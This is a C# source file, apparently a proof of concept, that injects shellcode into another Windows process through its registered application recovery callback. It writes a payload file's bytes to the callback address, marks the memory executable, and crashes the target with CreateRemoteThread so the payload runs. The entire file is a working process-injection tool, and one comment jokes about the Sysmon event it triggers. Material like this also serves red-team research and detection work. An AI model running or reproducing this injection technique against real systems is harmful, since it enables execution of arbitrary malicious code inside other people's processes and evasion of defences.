using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace RecoveryCallbackInject
{
	class Program
	{
		static void Main(string[] args)
		{
			//Need to specify a path to the payload.
			if (args.Length == 0)
			{
				Console.WriteLine("\n[*] Specify the filepath to payload.\n");
				Environment.Exit(0);
			}

			//Make sure the specified file exists.
			if (!File.Exists(args[0]))
			{
				Console.WriteLine("\n[!] File not found: {0}", args[0]);
				Environment.Exit(0);
			}

			string processName = "PoC_Victim"; //name of process to query for Recovery callbacks. 
			byte[] payload = File.ReadAllBytes(args[0]); //Convert the contents of a file of raw shellcode to a byte array


			Process targetProcessDetails = new Process();
			IntPtr registeredCallback = IntPtr.Zero;

			//Identify a victim process. This returns the Process details and the address of the recovery callback.  
			bool ret = FindRegisteredCallbacks(processName, out targetProcessDetails, out registeredCallback);
			if (!ret)
			{
				Console.WriteLine("[!] No recovery callback found. Exiting...");
				Console.ReadLine();
				Environment.Exit(0);
			}

			//Make sure we have the necessary data to continue.
			if (targetProcessDetails == null || registeredCallback == IntPtr.Zero)
			{
				Console.WriteLine("[!] Missing important process information. Exiting...");
				Environment.Exit(0);
			}

			//Use WriteProcessMemory to write the payload to the target process's registered callback address.
			IntPtr numWritten = IntPtr.Zero;
			ret = WriteProcessMemory(targetProcessDetails.Handle, registeredCallback, payload, payload.Length, out numWritten);
			if (!ret)
			{
				Console.WriteLine("[!] WriteProcessMemory: Failed to write payload. Exiting...");
				Environment.Exit(0);
			}

			Console.WriteLine("[+] WriteProcessMemory: Wrote payload to recovery callback address.");


			//Use VirtualProtectEx to change the memory protections to execute_read in the victim process
			uint oldProtect = 0;
			uint EXECUTE_READ = 0x20;
			ret = VirtualProtectEx(targetProcessDetails.Handle, registeredCallback, (UIntPtr)payload.Length, EXECUTE_READ, out oldProtect);
			if (!ret)
			{
				Console.WriteLine("[!] VirtualProtectEx: Failed to change memory protections to PAGE_EXECUTE_READ (0x20). Exiting...");
				Environment.Exit(0);
			}
			Console.WriteLine("[+] VirtualProtectEx: Successfully changed protections PAGE_EXECUTE_READ (0x20).");

			// For POC purposes, using CreateRemoteThread to crash the target process. You could call something else if you know a way, 
			// or perhaps wait for the victim to crash by itself? Idk. You do you.
			Console.WriteLine("[+] Everything should be good to go. Using CreateRemoteThread to crash the target process...");
			IntPtr id = IntPtr.Zero;
			CreateRemoteThread(targetProcessDetails.Handle, IntPtr.Zero, 0, (IntPtr)1, IntPtr.Zero, 0, out id); // Cries in Sysmon Event ID: 8

			if (id == IntPtr.Zero)
			{
				Console.WriteLine("[!] CreateRemoteThread: Failed to crash target process.");
				Environment.Exit(0);
			}
			else
			{
				Console.WriteLine("[+] CreateRemoteThread was successful. Target Process should have crashed, and executed the payload.");
				Environment.Exit(0);
			}
		}

		static bool FindRegisteredCallbacks(string victim, out Process process, out IntPtr recoveryCallback)
		{
			Process[] processList = Process.GetProcessesByName(victim); //shouldn't include ".exe". (like "notepad" not "notepad.exe")

			IntPtr pRC = IntPtr.Zero; // A pointer to the recovery callback function.
			IntPtr ppvParam = IntPtr.Zero; // A pointer to the callback parameter.
			uint pdwPI = 0; // The recovery ping interval, in 100-nanosecond intervals.
			uint reserved = 0; // Reserved for future use.

			foreach (Process proc in processList)
			{
				try
				{
					uint ret = GetApplicationRecoveryCallback(proc.Handle, out pRC, out ppvParam, out pdwPI, out reserved);
					if (ret == 0 && pRC != IntPtr.Zero)
					{
						Console.WriteLine("[+] Process Found: {0}", proc.ProcessName);
						process = proc;
						recoveryCallback = pRC;
						return true;
					}
				}
				catch
				{
					continue; //Keep looping through the other processes that have been identified
				}
			}

			process = null;
			recoveryCallback = IntPtr.Zero;

			return false;
		}

		// GetApplicationRecoveryCallback: https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getapplicationrecoverycallback
		[DllImport("kernel32.dll")]
		static extern uint GetApplicationRecoveryCallback(IntPtr hProcess, out IntPtr pRecoveryCallback, out IntPtr ppvParameter, out uint pdwPingInterval, out uint pdwFlags);

		// WriteProcessMemory: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
		[DllImport("kernel32.dll")]
		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

		// VirtualProtectEx: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		// CreateRemoteThread: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

	}
}
